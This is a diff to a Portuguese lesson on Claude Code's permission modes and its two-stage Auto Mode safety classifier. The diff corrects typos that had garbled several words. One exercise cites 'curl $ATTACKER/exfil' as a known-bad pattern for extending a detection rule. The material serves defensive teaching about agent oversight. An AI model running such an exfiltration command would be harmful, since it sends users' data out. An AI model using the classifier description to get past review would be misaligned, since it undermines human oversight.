@@ -13,7 +13,7 @@ Um agente de codificação autônomo na sua máquina é uma categoria de seguran
 
 O sistema de permissões do Claude Code é a resposta da Anthropic. Em vez de um único interruptor "autônomo / não autônomo", existem sete modos que cobrem uma escala de capacidade: plan → default → acceptEdits → … → bypassPermissions. Cada modo é um tradeoff diferente entre velocidade e revisão-por-ação. Auto Mode (março de 2026) adiciona um classificador de dois estágios que tira a aprovação do caminho crítico do usuário para ações que o classificador julga seguras, preservando uma camada de revisão para ações que o classificador sinaliza.
 
-A questão de engenhara: o que este sistema pega, o que ele perde, e qual modo uma tarefa eespecificaçãoífica realmente merece?
+A questão de engenhara: o que este sistema pega, o que ele perde, e qual modo uma tarefa específica realmente merece?
 
 ## O Conceito
 
@@ -79,7 +79,7 @@ A Anthropic lançou Auto Mode como preview de pesquisa. A documentação é expl
 
 1. Rode `code/main.py`. Qual tipo de ação sintética nunca é sinalizada pelo Estágio 1 mas sempre pega pelo Estágio 2? Qual não é pega por nenhum?
 
-2. Estenda o conjunto de regras do Estágio 1 para pegar uma forma eespecificaçãoífica conhecida-mau (ex: `curl $ATTACKER/exfil`). Meça a taxa de falso positivo na amostra de ações benignas.
+2. Estenda o conjunto de regras do Estágio 1 para pegar uma forma específica conhecida-mau (ex: `curl $ATTACKER/exfil`). Meça a taxa de falso positivo na amostra de ações benignas.
 
 3. Leia a doc "How the agente loop works" da Anthropic. Liste cada estado externo que o agente toca por padrão no modo `default`. Qual você precisaria controlar separadamente antes de rodar `autoMode` sem assistência?
 
@@ -106,4 +106,4 @@ A Anthropic lançou Auto Mode como preview de pesquisa. A documentação é expl
 - [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) — modelo de execução de serviço gerenciado.
 - [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) — superfície de features e anúncio do Auto Mode.
 - [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) — a camada baseada em raciocínio que molda os julgamentos do classificador.
-- [Anthropic — Measuring agente autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — perespecificaçãotiva interna sobre design de permissão de longo prazo.
+- [Anthropic — Measuring agente autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) — perspectiva interna sobre design de permissão de longo prazo.
